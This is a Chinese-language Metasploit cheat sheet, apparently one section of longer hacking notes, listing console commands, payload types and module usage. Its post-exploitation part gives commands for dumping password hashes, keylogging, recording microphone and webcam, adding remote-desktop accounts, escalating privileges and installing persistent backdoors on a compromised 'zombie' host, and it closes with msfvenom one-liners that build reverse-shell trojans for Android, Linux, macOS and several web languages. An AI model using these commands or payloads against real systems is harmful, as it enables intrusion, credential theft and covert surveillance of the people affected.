## 35. MSF（metasploit framework）
#msf
### 35.1 模块

1.   exploits 漏洞攻击模块列表（模块-系统-服务-名称）
2.   payloads 漏洞负载模块即入侵之后要做什么
3.   auxiliary 辅助模块，一般用于无载荷攻击
4.   encoder 编码器模块msfvenom -e 或者 msf执行过程中
5.   nops 无操作生成器模块
6.   post 开发模块

```shell
msfconsole
search MS17-010
#/opt/metasploit-framework/embedded/framework/modules
use auxiliary/scanner/mysql/mysql_login #mysql爆破
```

### 35.2 常用命令

```shell
db_autopwn Commands
===================

    Command       Description
    -------       -----------
    db_autopwn    Automatically exploit everything


Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu #查看某个命令的具体用法 ? search
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    exit          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    help          Help menu
    history       Show command history
    irb           Drop into irb scripting mode
    load          Load a framework plugin
    quit          Exit the console
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    set           Sets a context-specific variable to a value #设置指定参数
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    unload        Unload a framework plugin
    unset         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    advanced      Displays advanced options for one or more modules
    back          Move back from the current context
    edit          Edit the current module or a file with the preferred editor
    info          Displays information about one or more modules #查看模块的具体信息
    loadpath      Searches for and loads modules from a path
    options       Displays global options or for one or more modules #攻击所需信息show ~
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions #查找相关模块
    show          Displays modules of a given type, or all modules #列出所有相关模块
    use           Selects a module by name #使用某个模块


Job Commands
============

    Command       Description
    -------       -----------
    handler       Start a payload handler as job
    jobs          Displays and manages jobs
    kill          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored in a file


Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces


Credentials Backend Commands
============================

    Command       Description
    -------       -----------
    creds         List all credentials in the database
#########
LHOST #本地地址
RHOST #远程地址
run #开始执行
```

### 35.3 Payloads

1.   \_find\_tag：在一个已建立的连接上
2.   \_reverse\_tcp：反向连接到攻击者主机
3.   \_bind\_tcp：监听一个tcp连接
4.   \_reverse\_http：通过http隧道反向连接

==先结束对方计算机上的进程再关闭连接==

### 35.4 session

```shell
-e #要使用的有效载荷编码器
-f #强制开发漏洞，不考虑极小值的大小
-h #帮助
-j #后台运行
-n #使用nop发生器（默认）
-o #在VAR=VALL格式中的逗号分隔选项列表
-p #使用的有效载荷（默认）
-t #要使用的目标索引或名称（默认目标）
-z #成功开发后不与之会话交互
```

### 35.5 肉鸡基本操作

```shell
session #查看所有肉鸡列表（-i 在线的，-i 1打开第一个会话）
getuid #查看uid
sysinfo #查看肉鸡系统信息
run hashdump #dump目标主机的hash账号信息准备进行爆破
ps #查看目标主机进程
migrate 1576(pid) #切换自己为管理员，1576是管理员的进程ID
keyscan_start #开启键盘记录功能
keyscan_dump #查看键盘记录信息
keyscan_stop #停止键盘记录
run getgui -e #远程开启目标主机的远程桌面
run getgui -u cisco -p cisco #远程添加站好密码到目标主机
rdesktop 192.168.1.100 #远程桌面
record_mic -d 10 #录音十秒
webcam_chat #查看摄像头接口
webcam_list #查看摄像头列表
webcam_snap #从指定摄像头拍摄快照
webcam_stream #开启视频监控
screenshot #屏幕截图
getsystem #提权
#建立持久后门
##服务启动后门：
meterpreter > run metsvc -A //再开起一个终端，进入msfconsole
msf > use exploit/multi/handler //新终端中监听
msf > set payload windows/metsvc_bind_tcp
msf > set LPORT 31337
msf > set RHOST 192.168.0.128
msf > run //获取到的会话是system权限
##启动项启动后门
meterpreter > run persistence -X -i 10 -p 6666 -r 192.168.71.105
# -X 系统开机自启，-i 10 10秒重连一次，-p 监听端口，-r 监听机。直接监听就好了，他自己会链接回来。
# 注意到移除 persistence 后门的办法是删除 HKLM\Software\Microsoft\Windows\CurrentVersion\Run\ 中的注册表键和 C:\WINDOWS\TEMP\ 中的 VBScript 文件。
# 缺点：容易被杀毒软件杀 。
```

### 35.6 辅助模块

### 35.7 生成木马

```shell
#安卓app:
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.27 LPORT=8888 -o ~/Desktop/test2.apk
#Linux:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.27 LPORT=8888 -f elf > shell.elf
#Mac:
msfvenom -p osx/x86/shell_reverse_tcp LHOST=192.168.1.27 LPORT=8888 -f macho > shell.macho
#PHP：
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.27 LPORT=8888 -f raw -o test.php
#ASP:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.27 LPORT=8888 -f asp > shell.asp
#ASPX：
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.27 LPORT=8888 -f aspx > shell.aspx
#JSP:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.27 LPORT=8888 -f raw > shell.jsp
#Bash：
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.1.27 LPORT=8888 -f raw > shell.sh
#Perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.27 LPORT=8888 -f raw > shell.pl
#Python
msfvenom -p python/meterpreter/reverser_tcp LHOST=192.168.1.27 LPORT=8888 -f raw > shell.py
```

### 35.8 
git clone https://github.com/Green-m/msfvenom-zsh-completion ~/.oh-my-zsh/custom/plugins/msfvenom/
使用 nano 命令打开 ~/.zshrc 文件 nano~/.zshrc 找到 plugins=(git) 将 msfvenom 添加到里面 plugins=(gitmsfvenom)
source~/.zshrc